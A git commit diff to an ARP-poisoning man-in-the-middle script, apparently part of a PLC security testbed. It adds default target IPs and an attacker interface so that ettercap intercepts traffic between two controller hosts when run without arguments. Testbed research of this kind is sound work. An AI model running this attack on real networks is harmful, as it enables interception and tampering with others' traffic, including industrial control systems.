f55a210291b36e1cd067514272d984459bb8d199
francozappa <antonioli.daniele@gmail.com>
2015-05-25 12:19:23 +0800

    Default plc2 - plc1 - plc3 MIDM arp poisoning
    If issued without args it tries to perform a arp poisoning
    MITM attack sniffing from plc1-eth0 using plc2 and plc3
    as targets.

--- scripts/attacks/arp-mitm.sh
+++ scripts/attacks/arp-mitm.sh
@@ -9,8 +9,22 @@
 ettercap --help |grep -q 'MAC/IP/IPv6/PORT'
 ipv6command=$?
 
-if [[ $ipv6command -eq 0 ]]; then
-    ettercap -T -M arp:remote /$1// /$2// -i $3 &
+if [[ $# -eq 0 ]]; then
+    T1=192.168.1.20
+    T2=192.168.1.30
+    ATT_IFACE=plc1-eth0
+    echo "No argument, use default parameters"
+    echo "target IP1:" $T1
+    echo "target IP2:" $T2
+    echo "attacker interface:" $ATT_IFACE
 else
-    ettercap -T -M arp:remote /$1/ /$2/ -i $3 &
+    T1=$1
+    T2=$2
+    ATT_IFACE=$3
+fi
+
+if [[ $ipv6command -eq 0 ]]; then
+    ettercap -T -M arp:remote /$T1// /$T2// -i $ATT_IFACE &
+else
+    ettercap -T -M arp:remote /$T1/ /$T2/ -i $ATT_IFACE &
 fi
